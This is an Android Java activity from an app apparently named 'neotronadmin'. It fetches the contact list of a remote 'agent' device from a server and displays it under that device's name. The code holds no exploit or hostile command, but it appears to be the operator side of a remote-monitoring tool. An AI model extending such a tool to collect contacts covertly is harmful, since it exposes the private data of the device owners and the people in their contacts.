package com.pegalite.neotronadmin.ui.actions;

import android.annotation.SuppressLint;
import android.os.Bundle;
import android.view.View;

import androidx.annotation.Nullable;

import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import com.pegalite.neotronadmin.components.adapters.ContactsAdapter;
import com.pegalite.neotronadmin.components.models.ContactModel;
import com.pegalite.neotronadmin.databinding.ActivityContactsBinding;
import com.pegalite.neotronadmin.functions.server.req.RetrofitClient;
import com.pegalite.neotronadmin.functions.server.res.PegaCallback;
import com.pegalite.neotronadmin.functions.server.res.PegaResponseManager;
import com.pegalite.neotronadmin.functions.viewmanagers.PegaAppCompatActivity;

import org.json.JSONArray;

import java.lang.reflect.Type;
import java.util.List;

public class ContactsActivity extends PegaAppCompatActivity {

    ActivityContactsBinding binding;
    String agentID;

    @SuppressLint("SetTextI18n")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivityContactsBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        setWindowThemeMain();

        setBackWithRightAnim();

        binding.back.setOnClickListener(v -> getOnBackPressedDispatcher().onBackPressed());

        agentID = getIntent().getStringExtra("agentID");
        String deviceName = getIntent().getStringExtra("deviceName");
        binding.title.setText("Contacts [" + deviceName + "]");

        loadContacts();
    }

    private void loadContacts() {
        RetrofitClient.getInstance(this).getApiInterfaces().getContacts(agentID).enqueue(new PegaResponseManager(new PegaCallback(this, true) {
            @Override
            public void onSuccess(@Nullable JSONArray data) {
                if (data == null || data.length() == 0) {
                    binding.noContactsLabel.setVisibility(View.VISIBLE);
                    return;
                }

                binding.noContactsLabel.setVisibility(View.GONE);

                Type listType = new TypeToken<List<ContactModel>>() {
                }.getType();

                List<ContactModel> adminModelList = new Gson().fromJson(data.toString(), listType);
                ContactsAdapter adapter = new ContactsAdapter(adminModelList, ContactsActivity.this);
                binding.recyclerView.setAdapter(adapter);
            }
        }));
    }
}